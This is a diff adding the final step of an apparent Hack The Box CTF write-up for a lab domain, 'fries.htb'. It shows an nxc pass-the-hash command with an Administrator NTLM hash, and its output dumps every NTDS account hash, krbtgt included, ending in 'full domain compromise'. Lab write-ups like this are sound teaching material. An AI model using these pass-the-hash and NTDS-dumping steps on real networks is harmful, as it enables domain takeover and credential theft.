@@ -1309,7 +1309,43 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
 ```
 
+Now i have the NTLM hash for the user
 
+```python
+nxc smb dc01.fries.htb -u Administrator -H 'a773cb05d79273299a684a23ede56748' --ntds
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\Administrator:a773cb05d79273299a684a23ede56748 (Pwn3d!)
+SMB         10.129.244.72   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.129.244.72   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748:::
+SMB         10.129.244.72   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.244.72   445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ce86e3842ffc9a775d2a356c60eac9c3:::
+SMB         10.129.244.72   445    DC01             fries.htb\w.earl:2613:aad3b435b51404eeaad3b435b51404ee:ee2e704309cf4a26a4686a9d56489bf4:::
+SMB         10.129.244.72   445    DC01             fries.htb\d.cooper:2614:aad3b435b51404eeaad3b435b51404ee:50232f4444bc8fd6cfda4b3e1b715663:::
+SMB         10.129.244.72   445    DC01             fries.htb\b.horne:2615:aad3b435b51404eeaad3b435b51404ee:9cead10842a333fa049d4bc65cc55865:::
+SMB         10.129.244.72   445    DC01             fries.htb\b.briggs:2616:aad3b435b51404eeaad3b435b51404ee:cf1ec47b3cf4e869d5c8b7138c07bae4:::
+SMB         10.129.244.72   445    DC01             fries.htb\s.johnson:2617:aad3b435b51404eeaad3b435b51404ee:6e34ce1188061a026b8fb680d4a0ec9e:::
+SMB         10.129.244.72   445    DC01             fries.htb\j.hurley:2618:aad3b435b51404eeaad3b435b51404ee:e3fa3f2a91ee7f8451fd1d0338e65355:::
+SMB         10.129.244.72   445    DC01             fries.htb\h.truman:2619:aad3b435b51404eeaad3b435b51404ee:f9ac987d61cb1cf5649f82bc52778c3e:::
+SMB         10.129.244.72   445    DC01             fries.htb\d.lynch:2620:aad3b435b51404eeaad3b435b51404ee:327641bc7f835d4be5f7dd5e602e8df4:::
+SMB         10.129.244.72   445    DC01             fries.htb\l.palmer:2621:aad3b435b51404eeaad3b435b51404ee:1d44c7eb22b8c76b072f83fb07a56af3:::
+SMB         10.129.244.72   445    DC01             fries.htb\l.johnson:2622:aad3b435b51404eeaad3b435b51404ee:a191c320a175dbe32cba7c58ede45ec7:::
+SMB         10.129.244.72   445    DC01             fries.htb\h.jennings:2623:aad3b435b51404eeaad3b435b51404ee:b36354d4de8b39c31e13c950e969fbab:::
+SMB         10.129.244.72   445    DC01             fries.htb\svc_infra:3601:aad3b435b51404eeaad3b435b51404ee:3bf3a1986ea9ae5b54a5725847a2adcc:::
+SMB         10.129.244.72   445    DC01             fries.htb\d.wilson:5601:aad3b435b51404eeaad3b435b51404ee:b97330f3044941930b3667fa9888d5e3:::
+SMB         10.129.244.72   445    DC01             fries.htb\m.hannigan:5602:aad3b435b51404eeaad3b435b51404ee:e2c1ce7011b7564d594367b06ca2428c:::
+SMB         10.129.244.72   445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ba380858b63611eaadb906e8e5b55e3e:::
+SMB         10.129.244.72   445    DC01             gMSA_CA_prod$:1104:aad3b435b51404eeaad3b435b51404ee:1be70aa7a632cd28036169c6038a92a5:::
+SMB         10.129.244.72   445    DC01             FRIES.HTB\WEB$:4601:aad3b435b51404eeaad3b435b51404ee:61e3599900d7a81c373bcbaaa755bdb2:::
+SMB         10.129.244.72   445    DC01             [+] Dumped 20 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.129.244.72_2026-08-19_181453.ntds of which 17 were added to the database
+SMB         10.129.244.72   445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.129.244.72   445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.129.244.72_2026-08-19_181453.ntds | cut -d ':' -f1
+```
+
+Full domain compromise
+
+```python
+
+```
 
 
 
